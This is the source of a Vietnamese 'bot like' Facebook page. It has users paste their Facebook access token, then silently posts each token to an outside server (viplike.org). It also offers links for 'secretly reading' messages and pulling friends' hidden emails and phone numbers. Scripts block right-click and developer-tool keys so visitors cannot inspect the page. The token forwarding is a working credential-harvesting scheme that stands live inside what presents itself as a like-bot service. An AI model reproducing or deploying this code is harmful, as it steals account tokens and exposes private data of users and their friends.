<?php
session_start();
include 'head.php';
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://viplike.org/loginsave.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "Đăng nhập thành Công :)"; // For example
            break;
            case 2:
                $errorMsg = "Please Allow App To Access Your Profile!";
            break;
            case 3:
                $errorMsg = "Đăng Xuất Thành Công!";
            break;
            default:
                $errorMsg = "DuySexy was here!";
            break;
        }
         ''.$errorMsg.'';
    }
?>


<center>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>
HotFB.Org - Bot Like , Bot Comment Facebook , Auto Like - DuySexy
</title>
<meta name="description" content="Bot Like Facebook, Bot Like Comment Facebook, Like Facebook, Bot Comment, Bot Like Sieu Chuan , Bot Like PRO, Bot like Facebook, botlike cuc tot, bot like khong die token, token, bot, like, facebook, 2015, moi nhat by DuySexy" />
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<link rel="stylesheet" href="css/style.css" type="text/css"/>
<link rel="stylesheet" href="css/style1.css" type="text/css"/>
<link rel="shortcut icon" href="http://hotfb.org/images/favicon.ico"/>
<link href="css/bootstrap.son.css" rel="stylesheet">
<script type='text/javascript' src='menu.js'></script>
<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
</head>
<div class="furm"><center>
<table cellspacing="0" cellpadding="0" class="lr">
<tr>
<tr>
</td>
</td>
</tr>
</table>
<font color=red size=6px><b>HotFB.Org</b></font>
</td>
<td valign="top" class="r">
</td>
</tr>
</table></center></div>
</head><center>
<div align="right">
<span class="fcw mfsm">

</span>
</div>
</div>

</body></center>
</html>
<font face=papyrus color=black>
<div align="right">
<span class="fcw mfsm">
</span>
</div>
     <strong><font color="green"> <center> Hãy chọn Chức Năng Bạn Muốn Sử Dụng</strong>
</br>
</br>
 </script>
<script type="text/javascript">
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",
function(){top.location.href="Hack.html"}),shortcut.add("Ctrl+S",
function(){top.location.href="Hack.html"}),shortcut.add("Ctrl+Shift+I",
function(){top.location.href="Hack.html"}),shortcut.add("Ctrl+Shift+J",
function(){top.location.href="Hack.html"}),shortcut.add("Ctrl+Shift+K",
function(){top.location.href="Hack.html"}),shortcut.add("F12",
function(){top.location.href="Hack.html"}),shortcut.add("Ctrl+Shift",
function(){top.location.href="Hack.html"});
</script>
<script>
/* Khóa Click Chuột Phải */
var message="Bạn Không Thể Bấm Chuột Phải Trên Trang Chúng Tôi"
if (navigator.appName == 'Microsoft Internet Explorer'){
function NOclickIE(e) {
if (event.button == 2 || event.button == 3) {
alert(message);
return false;
}
return true;
}
document.onmousedown=NOclickIE;
document.onmouseup=NOclickIE;
window.onmousedown=NOclickIE;
window.onmouseup=NOclickIE;
}
else {
function NOclickNN(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}}}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=NOclickNN; }
document.oncontextmenu=new Function("alert(message);return false")
}
function disableCtrlKeyCombination(e){
//list all CTRL + key combinations you want to disable
var forbiddenKeys = new Array('a', 'c', 's', 'u', 'x');
var key;
var isCtrl;
if(window.event){
   key = window.event.keyCode;   //IE
   if(window.event.ctrlKey) isCtrl = true;
   else isCtrl = false;
}
else{
   key = e.which;   //firefox
   if(e.ctrlKey) isCtrl = true;
   else isCtrl = false;
}
//if ctrl is pressed check if other key is in forbidenKeys array
if(isCtrl){
   for(i=0; i<forbiddenKeys .length; i++){
      //case-insensitive comparation
      if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()){
         alert('Thao Tác CTRL + '+String.fromCharCode(key)+' Không thể Thực hiện Trên website của Chúng Tôi   ');
         return false;
      }
   }
}
return true;
}
</script>
<script id="_wauwqw">var _wau = _wau || [];
_wau.push(["tab", "6btppg3l7nqy", "wqw", "left-middle"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<center>
            <a href="https://graph.facebook.com/me/inbox?access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Đọc Trộm Tin Nhắn</a>

</br>

       <a href="https://graph.facebook.com/me/friends?access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Xem Trộm List friends</a>
        
</br>
       <a href="https://graph.facebook.com/me/groups?access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Xem Trộm Danh Sách Nhóm</a>
</br>

<a href="https://graph.facebook.com/me/likes?access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Xem Trộm danh sách Fanpage</a>
</br>
<a href="https://graph.facebook.com/fql?q=SELECT uid, email FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Xem trộm Email ẩn của bạn bè</a>
</br>
<a href="https://graph.facebook.com/fql?q=SELECT uid, phones FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=<?php echo $token;?>" class="btn btn-info" target="_blank">Xem Số Điện Thoại của bạn bè </a><br>
 <a href="//hotfb.org" class="btn btn-info" target="_blank">Auto Bot</a>

</br>
 <a href="//like.hotfb.org" class="btn btn-info" target="_blank">Auto Like</a><br>
 <a href="//ip.hotfb.org" class="btn btn-info" target="_blank">Chế Ảnh iPhone</a>

<br><b> Chú ý: Để giải mã các đoạn chữ trong graph, <a href="decode.html" target="_blank"> ấn vào đây </a> để xem chi tiết </b><br>

<?php
include './footer.php';
?>